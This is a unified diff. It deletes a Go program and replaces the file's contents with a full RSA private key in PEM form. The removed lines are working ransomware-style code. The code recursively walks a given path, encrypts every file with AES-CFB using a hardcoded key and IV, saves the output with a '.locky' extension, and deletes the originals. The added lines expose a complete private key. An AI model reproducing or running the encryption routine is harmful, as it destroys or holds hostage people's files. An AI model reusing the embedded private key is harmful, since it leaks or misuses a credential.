@@ -1,61 +1,27 @@
-package main
-
-import (
-	"crypto/aes"
-	"crypto/cipher"
-	"fmt"
-	"os"
-	"path/filepath"
-	"strings"
-)
-
-var bytes = []byte{35, 46, 57, 24, 85, 35, 24, 74, 87, 35, 88, 98, 66, 32, 14, 05}
-
-func run(fp string) ([]string, error) {
-	searchDir := fp
-
-	fileList := make([]string, 0)
-	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
-		if f.IsDir() != true {
-			fmt.Println("encrypting -> " + path)
-			ef, _ := os.Create(strings.Split(path, ".")[0] + ".locky")
-			ep, _ := EncryptFile(path, "abc&1*~#^2^#s0^=)^^7jb34")
-			ef.Write(ep)
-			os.Remove(path)
-			fileList = append(fileList, path)
-		}
-
-		return err
-	})
-
-	if e != nil {
-		panic(e)
-	}
-
-	// for _, file := range fileList {
-	// 	fmt.Println(file)
-	// }
-
-	return fileList, nil
-}
-
-func EncryptFile(fp string, MySecret string) ([]byte, error) {
-	block, err := aes.NewCipher([]byte(MySecret))
-	if err != nil {
-		fmt.Println(err)
-		return []byte(""), err
-	}
-	file, _ := os.ReadFile(fp)
-	cfb := cipher.NewCFBEncrypter(block, bytes)
-	cipherFile := make([]byte, len(file))
-	cfb.XORKeyStream(cipherFile, file)
-	return cipherFile, nil
-}
-
-func main() {
-	if len(os.Args[:]) < 2 {
-		fmt.Println(os.Args[0] + " <path>")
-		return
-	}
-	run(os.Args[1])
-}
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEArOXiAJN5xewp10n4QUFb7b3RGUpL1ZVfqq3sE9eLElxqyd5u
+Ymjw+bdWKZCfw65xRQMdQwPKek1R1mjSrxHTAYtPa61Fjg6SJ4yBoxWGq59PQlsE
+0RGFAcJP5gAS0uE+dKyXQs70ZIEF8Qnzyj39Vio5rWYCvM9O2BR1C0CoisMJCzQX
+mJR+4OCromEJTv4EQuhXSWxwrVldbwcTWN/OHZ7Lqlzyg0Dsy87k/oM4XII/c/zo
+BIVv5GxlWraa6B+QzajXFaNNNn4Z/W0ELEkjgytMiEbyZKeNuWqfK5U3lZOl4ERA
+XTxT90FoK8xCA+n55h1w1Up9E2luPvLa8Ttn1QIDAQABAoIBAQCbebkqlXNalMzn
+SSAR5ik5d4ixeksJTGKTxARXr2ri3vI0h22x1vZjSAcWJ3RTbelziqJkoeMQ6bie
+2vIh9iBN8i1AAbdbUCUDpWjp8zB/4ilO3TROoLd/ZnGcvRIwSdZ06sK2lA3W1uM1
+5qIwil/mfOAS2nm5uZ4H1xWNQd6Nr+VZjbeoxqGI+ItSoPHyYRq+2VfSz43+zGRg
+t8hQ0NfT8vJxNvNjmb8bA7zDT9rSMy5u+FVjY+JjX299KtgUyX1AwCPiWt8EpVT7
+4qqYELlsmBDkE202lSPShMgwqa+rA3lBbx5gJQA7QDeQhKB67Rp17knU/vZjNwfZ
+CHyTjCNdAoGBAP8/hZMCMDAtYBDjQNvDqFs3TghRWw0lWLMUAWmFqILRhVxiHKl4
+7LBNUW1jL0QpdkRinG4RszE7uXPRgqLTLAv8/POBeKB4xkmFIfBsgS2VSt1LrVn5
+XXgQLseYVDTd6eC+m2pxwPeTeJgh2d5liR5jvWbStt7+cwjafN1F7rhvAoGBAK1o
+QyBvtCJcNyJyB1mU3E//5UFm/PklsH0w/nlbfh1SeQ0gW/ZNwTWE0Maa4LoDLUUO
+oNAC6g8fVQUbZWODSMN+ENoTlEPa4JDzxClmf8wij9pPLXKwE/8rdReBzPYiaPHS
+dIx54wf6S3lexQesRaHop1vJkoMyVY/zEflTOB37AoGBAMDK3Px+EaHCFCaNT+bu
+cRJ8wm7b7FcQl1+jw7FNaEtvMDjoTlffY3+C1vc1jHUCkDb0+MzWh6+vOdN2MyMD
+N+jSLMlMSK2Eq9jKOyla+3NPqV1fFM+531SZfIv7zdakq0u7DK6ovyUA+XyHTQWD
+Ub9nfJ7Wl5P1QzQzu05yzO33AoGAN1JH+BUq9rtMq6SNS7r9/le5IABnPGUVxRrY
+VIcn2Nry24kzTYTI2vYgVPwcLbvNuXZNP49udJyeVx7CXdkIYbXaUnhkmLE/a38Z
+WcvlgY6VLiSMb0ZVWtbWaEV0yiF4MY3euOI519W2NmZRnX0MSfcbTWElaM2qFl6J
+oW03PfkCgYAs0YP5DiuI8y5WaqlMTROk5+HMltqVdX6OmDqVZAM8dszmxao5ONVg
+t0QKpUv2hrq5IdITqSw7TMWfKv2QlJyz4fs3WksnmMb55yIk8p3XifdWTN4YJNHf
+ogeGTRIkU4jnog6/PUAOCvpEmVE0LRoXjQo9wCMN27H71NjxmxyFtw==
+-----END RSA PRIVATE KEY-----
